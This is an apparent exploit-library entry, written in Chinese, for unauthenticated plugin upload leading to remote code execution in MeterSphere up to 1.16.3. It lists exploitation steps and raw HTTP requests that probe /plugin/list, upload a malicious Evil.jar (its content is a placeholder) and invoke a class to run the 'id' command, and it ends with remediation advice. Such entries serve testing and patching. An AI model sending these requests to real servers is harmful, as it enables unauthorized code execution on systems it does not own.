---
id: METERSPHERE-PLUGIN-RCE
title: MeterSphere 插件接口未授权访问及远程代码执行
product: metersphere
vendor: MeterSphere
version_affected: "<=1.16.3"
severity: CRITICAL
tags: [rce, file_upload, 无需认证]
fingerprint: ["MeterSphere"]
---

## 漏洞描述

MeterSphere是基于GPLv3协议的一站式的开源持续测试平台。在其1.16.3版本及以前，插件相关管理功能未授权访问，导致攻击者可以通过上传插件的方式在服务器中执行任意代码。

## 影响版本

- MeterSphere <= 1.16.3

## 前置条件

- 无需认证（/plugin/* 接口未授权访问）
- 需要能够访问 /plugin/list 接口确认存在

## 利用步骤

1. 访问 `/plugin/list` 确认插件接口未授权
2. 准备恶意 MeterSphere 插件 JAR 包
3. 上传恶意插件
4. 调用插件中的恶意类执行代码

## Payload

```http
# 确认未授权访问
GET /plugin/list HTTP/1.1
Host: target:8081

# 上传恶意插件
POST /plugin/add HTTP/1.1
Host: target:8081
Content-Type: multipart/form-data; boundary----WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Length: 11985

------WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Disposition: form-data; name="file"; filename="Evil.jar"
Content-Type: application/java-archive

[malicious jar content]
------WebKitFormBoundaryJV2KX1EL5qmKWXsd--

# 执行插件中的恶意类
POST /plugin/customMethod HTTP/1.1
Host: target:8081
Content-Type: application/json

{"entry": "org.vulhub.Evil", "request": "id"}
```

## 验证方法

```bash
# 检查恶意代码是否执行（如创建文件、执行命令）
```

## 修复建议

1. 升级 MeterSphere 至 1.16.4+
2. 对插件上传接口添加认证和权限校验
3. 限制插件来源，只允许可信插件安装
